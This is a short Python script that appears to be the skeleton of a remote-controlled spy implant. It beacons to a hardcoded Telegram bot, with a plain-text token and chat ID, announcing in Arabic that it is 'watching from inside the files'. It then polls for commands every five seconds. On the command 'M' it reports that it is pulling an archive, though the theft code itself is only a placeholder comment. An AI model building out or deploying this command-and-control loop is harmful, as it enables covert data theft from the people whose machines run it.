import os
import time
import requests

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"

def send_msg(txt):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": txt}, timeout=10)
    except: pass

def get_command():
    try:
        # قراءة آخر رسالة فقط لمنع التكرار وضمان الاستجابة
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1"
        res = requests.get(url, timeout=15).json()
        if res.get("result"):
            return res["result"][0].get("message", {}).get("text", "").upper()
    except: return None
    return None

if __name__ == '__main__':
    send_msg("🚀 ملك الظلال استيقظ الآن وهو يراقب من داخل الملفات..")
    
    while True:
        cmd = get_command()
        if cmd == "M":
            send_msg("💀 تم استقبال الأمر M.. جاري سحب الأرشيف فوراً!")
            # كود السحب يوضع هنا
            
        time.sleep(5) # فحص كل 5 ثواني
